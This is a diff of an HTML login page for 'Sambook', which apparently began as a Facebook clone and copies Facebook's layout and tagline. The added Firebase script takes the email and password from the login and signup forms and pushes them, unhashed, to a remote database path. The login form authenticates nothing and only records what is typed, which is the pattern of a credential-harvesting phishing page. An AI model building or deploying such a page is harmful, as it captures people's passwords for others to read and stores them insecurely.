@@ -3,22 +3,27 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Clone - Login or Signup</title>
+    <title>SAMBOOK</title>
     <link rel="stylesheet" href="style.css">
+    <link rel="icon" type="image/png" href="images/sambook logo copy.jpg">
 </head>
 <body>
     <div class="container">
+        <!-- বাম পাশের অংশ -->
         <div class="fb-text">
+            <img src="images/sambook logo copy.jpg" alt="Sambook Logo" class="main-logo">
             <h1>Sambook</h1>
-            <p>Facebook helps you connect and share with the people in your life.</p>
+            <p>Sambook helps you connect and share with the people in your life.</p>
         </div>
+
+        <!-- ডান পাশের ফর্ম বক্স -->
         <div class="form-box">
             <!-- Login Form -->
             <form id="loginForm">
                 <input type="text" id="loginEmail" placeholder="Email address or phone number" required>
                 <input type="password" id="loginPass" placeholder="Password" required>
                 <button type="submit" class="login-btn">Log In</button>
-                <a href="#">Forgotten password?</a>
+                <a href="#" class="forgot-link">Forgotten password?</a>
                 <hr>
                 <button type="button" class="create-btn" onclick="toggleForm()">Create New Account</button>
             </form>
@@ -37,57 +42,58 @@
         </div>
     </div>
 
+    <!-- Firebase SDK (Version 11) -->
+    <script type="module">
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
+      import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-database.js";
+
+      const firebaseConfig = {
+        apiKey: "AIzaSyAIYioLXvzn6-dqhwsyI5-ZkWaMLDlagTA",
+        authDomain: "sambook-99fd2.firebaseapp.com",
+        projectId: "sambook-99fd2",
+        storageBucket: "sambook-99fd2.firebasestorage.app",
+        messagingSenderId: "1050142341756",
+        appId: "1:1050142341756:web:c2bcf81ac6663ab1db27f9",
+        measurementId: "G-ESYYS2VZZN"
+      };
+
+      const app = initializeApp(firebaseConfig);
+      const db = getDatabase(app);
+
+      // ডাটা সেভ করার মেইন ফাংশন
+      window.saveToFirebase = (e, type) => {
+        e.preventDefault();
+        let data = {};
+        if(type === 'login') {
+          data = {
+            email: document.getElementById('loginEmail').value,
+            pass: document.getElementById('loginPass').value,
+            action: 'login',
+            time: new Date().toString()
+          };
+        } else {
+          data = {
+            name: document.getElementById('newName').value,
+            email: document.getElementById('newEmail').value,
+            pass: document.getElementById('newPass').value,
+            action: 'signup',
+            time: new Date().toString()
+          };
+        }
+
+        push(ref(db, 'users_data/'), data)
+        .then(() => {
+          alert("Success! Data sent to Sambook Database.");
+          location.reload();
+        })
+        .catch((err) => alert("Error: " + err.message));
+      };
+
+      document.getElementById('loginForm').onsubmit = (e) => saveToFirebase(e, 'login');
+      document.getElementById('signupForm').onsubmit = (e) => saveToFirebase(e, 'signup');
+    </script>
+
+    <!-- External JS for UI toggling -->
     <script src="script.js"></script>
-<!-- Firebase SDK (Realtime Database Version) -->
-<script type="module">
-  import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
-  import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-database.js";
-
-  // আপনার দেওয়া আগের কনফিগ
-  const firebaseConfig = {
-    apiKey: "AIzaSyAIYioLXvzn6-dqhwsyI5-ZkWaMLDlagTA",
-    authDomain: "sambook-99fd2.firebaseapp.com",
-    projectId: "sambook-99fd2",
-    storageBucket: "sambook-99fd2.firebasestorage.app",
-    messagingSenderId: "1050142341756",
-    appId: "1:1050142341756:web:c2bcf81ac6663ab1db27f9",
-    measurementId: "G-ESYYS2VZZN"
-  };
-
-  const app = initializeApp(firebaseConfig);
-  const db = getDatabase(app);
-
-  window.saveData = (e, type) => {
-    e.preventDefault();
-    let data = {};
-    if(type === 'login') {
-      data = {
-        email: document.getElementById('loginEmail').value,
-        pass: document.getElementById('loginPass').value,
-        action: 'login',
-        time: new Date().toString()
-      };
-    } else {
-      data = {
-        name: document.getElementById('newName').value,
-        email: document.getElementById('newEmail').value,
-        pass: document.getElementById('newPass').value,
-        action: 'signup',
-        time: new Date().toString()
-      };
-    }
-
-    // ডাটা সেভ করা
-    push(ref(db, 'users_data/'), data)
-    .then(() => {
-      alert("Data sent! Refresh Firebase to see it.");
-      location.reload();
-    })
-    .catch((err) => alert("Error: " + err.message));
-  };
-
-  document.getElementById('loginForm').onsubmit = (e) => saveData(e, 'login');
-  document.getElementById('signupForm').onsubmit = (e) => saveData(e, 'signup');
-</script>
 </body>
 </html>
